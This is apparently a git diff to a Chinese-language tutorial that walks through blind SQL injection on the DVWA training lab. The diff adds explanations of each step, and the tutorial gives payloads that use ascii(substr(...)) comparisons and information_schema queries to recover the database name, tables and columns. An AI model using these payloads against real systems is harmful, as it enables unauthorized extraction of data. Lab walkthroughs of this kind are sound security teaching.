@@ -2,6 +2,8 @@
 
 > ## @Date：2021-4-29
 >
+> ## @Last：2021-4-30
+>
 > ## @Author：Tanyiqu
 
 ## low
@@ -31,11 +33,25 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 
 可以判断输入存在SQL注入
 
+同时我们可以看出：页面只有两种反馈，用户存在和用户不存在
+
 
 
 ### 尝试猜测数据库名称
 
 #### 首先猜测数据库长度
+
+##### 原理
+
+```
+使用 length(database()) 计算数据库的长度
+再依次判断该值
+如果提示用户存在，则猜测正确，否则猜测错误
+```
+
+
+
+##### 尝试
 
 依次尝试下面语句
 
@@ -51,6 +67,21 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 
 
 #### 尝试猜解数据库名
+
+从数据库名的第一位字符开始，依次猜解每一位的字符，猜解使用二分法
+
+##### 原理
+
+```
+先用 substr(database(),1,1) 截取数据库的第一位字符
+再用 ascii() 将第一位字符转成ASCII值
+再判断 该值是否大于字符a(97)的ASCII值
+如果提示用户存在，则大于a，否则不大于a
+```
+
+
+
+##### 尝试
 
 ```
 1' and ascii(substr(database(),1,1))>97 # 提示用户存在，说明数据库名第一位字符的ASCII值大于97(a)
@@ -74,6 +105,20 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 
 #### 猜解数据库的表的数量
 
+##### 原理
+
+```
+在MySQL中，使用下面语句可以查出对应数据库有多少张表
+select count(table_name) from information_schema.tables where table_schema='dvwa'
+
+再依次判断该值
+如果提示用户存在，则猜测正确，否则猜测错误
+```
+
+
+
+##### 尝试
+
 ```
 1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=1 # 提示不存在
 
@@ -85,6 +130,19 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 
 
 #### 依次猜解表的长度
+
+##### 原理
+
+```
+下面语句可以查出数据库中 第一张表的名字
+select table_name from information_schema.tables where table_schema='dvwa' limit 0,1
+
+再取长度，依次判断
+```
+
+
+
+##### 尝试
 
 ```
 1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=1 # 提示不存在
@@ -104,11 +162,30 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=5 # 提示存在
 ```
 
-说明第一张表的长度为5
+说明第二张表的长度为5
 
 
 
 #### 猜解表名
+
+##### 原理
+
+```
+先查出第一张表的名字，暂定为tname
+select table_name from information_schema.tables where table_schema='dvwa' limit 0,1
+
+再截取第一个字符，暂定为char
+substr(tname,1,1)
+
+在计算它的ASCII值
+ascii(char)
+
+最后使用二分法猜测具体指
+```
+
+
+
+##### 尝试
 
 ```
 # 第一张表
@@ -144,7 +221,20 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 
 
 
-#### 猜解表的字段名
+#### 猜解表的字段数量
+
+##### 原理
+
+```
+先查出users表中的字段数量
+select count(column_name) from information_schema.columns where table_name= 'users'
+
+再依次猜解
+```
+
+
+
+##### 尝试
 
 猜user表中的字段数量
 
@@ -157,7 +247,7 @@ substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
 
 
 
-依次猜解user表的字段
+#### 猜解user表的字段
 
 猜解第1个字段的长度
 
@@ -243,12 +333,12 @@ user_id
 
 ## medium
 
-
+需要配合BP抓包
 
 <br>
 
 ## high
 
-
+需要配合BP抓包
 
 <br>
